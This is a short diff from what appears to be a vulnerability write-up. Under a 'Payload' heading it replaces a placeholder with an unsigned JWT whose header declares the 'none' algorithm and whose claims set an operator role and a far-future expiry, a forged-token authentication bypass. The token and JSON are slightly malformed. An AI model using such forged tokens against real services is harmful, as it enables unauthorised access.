@@ -28,7 +28,7 @@ Payload:
 {
  "name":"Tavares Lunik Bernardi",
  "role":"operador"
- "Authorization:""Bearer TOKEN_FORMATO_JWT"
+ "Authorization: Bearer eyjhbGciOiJub25lIiwidHlwIjoiSldUIn0,eyJuYWIlrjoiVGF2YXJlcyBMdW5payBCZXJuYXJkaSIsInJvbGUiOiJPUEVSQURPUiIsImlhdCI6MTY0MDk5NTIwMCwiZXhwIjoxOTQwOTk1MjAwdQ"
 }
 
 ## Exploitation
